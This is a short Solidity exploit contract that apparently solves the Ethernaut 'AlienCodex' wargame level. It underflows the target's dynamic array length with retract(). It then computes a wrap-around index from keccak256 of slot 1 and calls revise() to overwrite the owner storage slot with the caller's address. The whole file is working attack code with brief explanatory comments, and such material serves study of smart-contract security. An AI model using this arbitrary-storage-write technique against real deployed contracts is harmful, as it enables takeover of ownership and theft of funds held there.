// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface IAlienCodex {
    function makeContact() external;

    function retract() external;

    function revise(uint i, bytes32 _content) external;
}

contract AlienCodexAttack {
    function attack(IAlienCodex _target) external {
        _target.makeContact();
        _target.retract();

        // Calculating index of the slot which stores first element of codex array
        // (slot with index 1 stores codex array header )
        uint256 _slotIndex = uint256(keccak256(abi.encode(1)));
        // Underflow
        uint256 _index = 0 - _slotIndex;
        _target.revise(_index, bytes32(uint256(uint160(msg.sender))));
    }
}
